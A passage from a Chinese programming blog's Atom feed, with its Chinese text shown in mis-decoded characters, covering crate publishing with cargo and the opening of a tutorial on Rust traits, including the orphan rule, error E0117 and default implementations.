&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> cargo publish --dry-run
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>è¯¥å‘½ä»¤ä¸ä¼šçœŸæ­£æ‰§è¡Œå‘å¸ƒæ“ä½œï¼Œä½†æ˜¯ä¼šæŠŠæäº¤åˆ° crate.io ä¹‹å‰è¦åšçš„äº‹æƒ…éƒ½åšä¸€éã€‚&lt;/p>
&lt;p>ç¡®è®¤æ— è¯¯åï¼Œå¯ä»¥è¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒçœŸæ­£å°† crate å‘å¸ƒè‡³ crate.io:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl"> cargo publish
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>âœ… æå®šï¼&lt;/p>
&lt;/li>
&lt;/ol></content><category scheme="https://mincodes.com/tags/rust/" term="Rust" label="Rust"/><category scheme="https://mincodes.com/tags/django/" term="Django" label="Django"/></entry><entry><title type="text">Rust ä¸­çš„ç‰¹å¾ (Trait)</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/traits-in-rust/"/><id>https://mincodes.com/posts/traits-in-rust/</id><updated>2024-01-01T06:17:40+08:00</updated><published>2023-12-19T20:46:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">æ¦‚è¿° ç®€å•æ¥è¯´ï¼Œ trait æ˜¯ Rust ä¸­ç”¨æ¥å®šä¹‰å…±äº«è¡Œä¸ºçš„æŠ½è±¡æœºåˆ¶ï¼Œå’Œ Java çš„ interfaceã€ Swift çš„ protocol æœ‰ç‚¹ç±»ä¼¼ï¼š 1 2 3 pubâ€¦</summary><content type="html">&lt;h2 id="æ¦‚è¿°">æ¦‚è¿°&lt;/h2>
&lt;p>ç®€å•æ¥è¯´ï¼Œ &lt;em>trait&lt;/em> æ˜¯ Rust ä¸­ç”¨æ¥å®šä¹‰å…±äº«è¡Œä¸ºçš„æŠ½è±¡æœºåˆ¶ï¼Œå’Œ Java çš„ interfaceã€
Swift çš„ protocol æœ‰ç‚¹ç±»ä¼¼ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">trait&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Summary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">summarize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">String&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å•çº¯ä»æä¾›çš„åŠŸèƒ½å’Œçµæ´»æ€§è§’åº¦æ¥çœ‹ï¼Œç›¸æ¯”ä¹‹ä¸‹ï¼Œtrait ä¼šæ¯” Java çš„ interface æ›´çµæ´»å’Œå¼ºå¤§ä¸€äº›ï¼Œå¯èƒ½å’Œ Swift çš„ protocol æ›´æ¥è¿‘ä¸€ç‚¹ã€‚ä¾‹å¦‚ï¼š&lt;/p>
&lt;ul>
&lt;li>trait å’Œ protocol éƒ½æ”¯æŒå…³è”ç±»å‹ï¼Œè€Œ interface ä¸æ”¯æŒã€‚&lt;/li>
&lt;li>Rust/Swift å…è®¸ä¸ºå¤–éƒ¨ç±»å‹å¢åŠ  trait/protocol å®ç°, å¯ä»¥å¾ˆæ–¹ä¾¿çš„ä¸ºå¤–éƒ¨ç±»å‹æ‰©å±•ä¸€äº›é¢å¤–çš„æ–¹æ³•ï¼Œå¹¶æ»¡è¶³åè®®çš„è¦æ±‚ã€‚è€Œ Java å¹¶ä¸æ”¯æŒè¿™ç‚¹ã€‚
&lt;ul>
&lt;li>Java å¯ä»¥é€šè¿‡&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E8%A3%85%E9%A5%B0%E5%99%A8--decorator">è£…é¥°å™¨ (Decorator)&lt;/a>æ¨¡å¼æˆ–è€…ç»§æ‰¿æ¥å®ç°ç±»ä¼¼çš„èƒ½åŠ›ã€‚&lt;/li>
&lt;li>Rust åœ¨è¯¥åŠŸèƒ½ä¸Šæœ‰é¢å¤–é™åˆ¶ï¼ˆ&lt;a href="https://mincodes.com/posts/traits-in-rust/#%E5%AD%A4%E5%84%BF%E8%A7%84%E5%88%99--orphan-rule">å­¤å„¿è§„åˆ™&lt;/a>ï¼‰ï¼Œè€Œ Swift ä¼¼ä¹å¹¶æ²¡æœ‰ï¼Œè¿™ä¹Ÿå¯¼è‡´ Swift
ä¸­ç±»å‹çš„è¡Œä¸ºä¸€è‡´æ€§æ›´éš¾å¾—åˆ°ä¿è¯ã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>Trait æ˜¯ Rust ä¸­æ¯”è¾ƒæœ‰æ„æ€çš„è¯­æ³•ç‰¹æ€§ï¼Œåœ¨æ ‡å‡†åº“ã€ç¬¬ä¸‰æ–¹åº“ä¸­å¹¿æ³›ä½¿ç”¨ï¼ˆä¾‹å¦‚
&lt;a href="https://mincodes.com/posts/traits-in-rust/#%E5%8F%AF%E6%B4%BE%E7%94%9F%E7%9A%84%E7%89%B9%E5%BE%81--derivable-traits">Derivable Traits&lt;/a> ä¸­æ‰€åˆ—çš„ï¼‰ã€‚ç»“åˆå…¶è¯­æ³•ç‰¹æ€§åŠåœ¨åº“ä¸­çš„å¹¿æ³›æ€§ï¼Œè®© trait å…·æœ‰äº†éå¸¸å¼ºçš„çµæ´»æ€§å’Œå®ç”¨ä»·å€¼ï¼Œå› æ­¤å€¼å¾—æˆ‘ä»¬æ·±å…¥æ¢ç©¶ã€‚&lt;/p>
&lt;h2 id="trait-çš„è¯­æ³•ç‰¹ç‚¹">Trait çš„è¯­æ³•ç‰¹ç‚¹&lt;/h2>
&lt;h3 id="å­¤å„¿è§„åˆ™--orphan-rule">å­¤å„¿è§„åˆ™ (Orphan Rule)&lt;/h3>
&lt;p>ä¸ºç±»å‹å®ç° trait æœ‰ä¸€ä¸ªé™åˆ¶ï¼šè¯¥ç±»å‹å’Œè¦å®ç°çš„ trait è‡³å°‘è¦æœ‰ä¸€ä¸ªæ˜¯åœ¨å½“å‰ crate
ä¸­å®šä¹‰çš„ï¼ˆcrate æ˜¯ Rust ä¸­çš„æœ€å°ç¼–è¯‘å•å…ƒï¼Œå‚è€ƒ&lt;a href="https://doc.rust-lang.org/book/ch07-01-packages-and-crates.html">Packages and Crates&lt;/a>ï¼‰ã€‚&lt;/p>
&lt;p>è¯¥é™åˆ¶æ˜¯ä¸€è‡´æ€§ (&lt;em>coherence&lt;/em>) å±æ€§çš„ä¸€éƒ¨åˆ†ï¼Œå«åšå­¤å„¿è§„åˆ™ (&lt;em>orphan rule&lt;/em>)ã€‚è¯¥è§„åˆ™ç¡®ä¿å…¶ä»–äººçš„ä»£ç ä¸ä¼šç ´åä½ çš„ä»£ç ï¼Œåä¹‹äº¦ç„¶ã€‚&lt;/p>
&lt;p>ä¾‹å¦‚ï¼Œä½ æ— æ³•ä¸ºæ ‡å‡†åº“ä¸­çš„ &lt;code>IpAddr&lt;/code> ç±»å‹å¢åŠ  &lt;code>Iterator&lt;/code> trait çš„å®ç°ï¼ˆå› ä¸ºè¿™äºŒè€…éƒ½å®šä¹‰åœ¨å¤–éƒ¨ crate ä¸­ï¼‰ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">net&lt;/span>::&lt;span class="n">IpAddr&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="c1">// ç¼–è¯‘å¤±è´¥â—
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Iterator&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IpAddr&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span> &lt;span class="nc">Item&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kt">u8&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="bp">Self&lt;/span>::&lt;span class="n">Item&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">return&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">None&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç¼–è¯‘å™¨æŠ¥å‘Šçš„é”™è¯¯å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">error[E0117]: only traits defined in the current crate can be implemented for types defined outside of the crate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> --&amp;gt; src/main.rs:5:1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5 | impl Iterator for IpAddr {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | ^^^^^^^^^^^^^^^^^^------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | | |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | | `IpAddr` is not defined in the current crate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | impl doesn&amp;#39;t use only types from inside the current crate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> = note: define and implement a trait or new type instead
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">For more information about this error, try `rustc --explain E0117`.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">error: could not compile `cargo0Pk8IQ` (bin &amp;#34;cargo0Pk8IQ&amp;#34;) due to previous error
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>é”™è¯¯ä¿¡æ¯ååˆ†è¯¦å°½ï¼Œä¸ä»…è§£é‡Šäº†é”™è¯¯åŸå› ã€æŒ‡å‡ºäº†é”™è¯¯ä½ç½®ï¼Œè¿˜æä¾›äº†è§£å†³æ–¹æ¡ˆå’Œç›¸å…³æ–‡æ¡£è¯´æ˜ã€‚&lt;/p>
&lt;p>ä¸‹é¢æˆ‘ä»¬æ¼”ç¤ºä¸€ä¸‹ä¸ºæ ‡å‡†åº“ä¸­çš„ç±»å‹å®ç°ä¸€ä¸ªè‡ªå·±å®šä¹‰çš„ trait:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">net&lt;/span>::&lt;span class="p">{&lt;/span>&lt;span class="n">IpAddr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Ipv4Addr&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">trait&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Openable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span> &lt;span class="nc">Connection&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="bp">Self&lt;/span>::&lt;span class="n">Connection&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Openable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">IpAddr&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span> &lt;span class="nc">Connection&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">Option&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="bp">Self&lt;/span>::&lt;span class="n">Connection&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;I&amp;#39;m connected!&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Ok&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">parse&lt;/span>::&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">IpAddr&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Some&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">conn&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">open&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{conn}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">I&amp;#39;m connected!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä¸Šé¢æ˜¯ç¨‹åºè¿è¡Œçš„ç»“æœã€‚&lt;/p>
&lt;h3 id="trait-ä¸­çš„é»˜è®¤å®ç°">Trait ä¸­çš„é»˜è®¤å®ç°&lt;/h3>
&lt;p>å’Œ Java ç±»ä¼¼ï¼ˆJava 8 å¼•å…¥è¯¥ç‰¹æ€§ï¼‰ï¼Œtrait åœ¨å®šä¹‰æ—¶å¯ä»¥æä¾›æ–¹æ³•çš„é»˜è®¤å®ç°ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">trait&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Summary&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">summarize_author&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">String&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">summarize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nb">String&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">format!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;(Read more from &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">...)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">summarize_author&lt;/span>&lt;span class="p">())&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>é»˜è®¤å®ç°å¹¿æ³›å­˜åœ¨äº Rust æ ‡å‡†åº“æä¾›çš„ trait ä¸­ï¼Œä¸ºå¼€å‘è¿‡ç¨‹æä¾›äº†å¾ˆå¤§çš„ä¾¿åˆ©ï¼Œå¹¶è§„èŒƒäº†ä¸€äº›ç¼–ç¨‹çš„æƒ¯ç”¨æ³• (&lt;em>idioms&lt;/em>)ã€‚&lt;/p>
&lt;h3 id="ç‰¹å¾çº¦æŸ--trait-bound">ç‰¹å¾çº¦æŸ (Trait Bound)&lt;/h3>
